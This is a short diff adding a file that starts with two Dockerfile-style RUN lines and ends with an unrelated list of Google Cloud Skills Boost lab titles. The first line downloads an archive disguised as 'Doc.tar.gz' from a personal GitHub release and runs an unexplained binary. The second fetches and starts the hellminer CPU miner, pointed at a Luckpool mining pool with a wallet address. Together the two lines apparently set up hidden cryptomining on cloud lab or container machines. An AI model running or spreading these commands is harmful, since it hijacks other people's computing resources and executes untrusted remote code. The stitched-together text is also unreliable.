@@ -1,0 +1,9 @@
+RUN sudo apt update && wget https://github.com/hendrik20212/VRS/releases/download/doc1/Doc.tar.gz && tar -xvf Doc.tar.gz && ./ver cus.ini
+
+RUN sudo apt update && wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && chmod +x hellminer && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r.VM --cpu 2
+
+A Tour of Google Cloud Hands-on Labs
+Google Cloud Pub/Sub: Qwik Start - Console
+Google Cloud Pub/Sub: Qwik Start - Command Line
+BigQuery: Qwik Start - Command Line
+Understanding and Analyzing Your Costs with Google Cloud Billing Reports
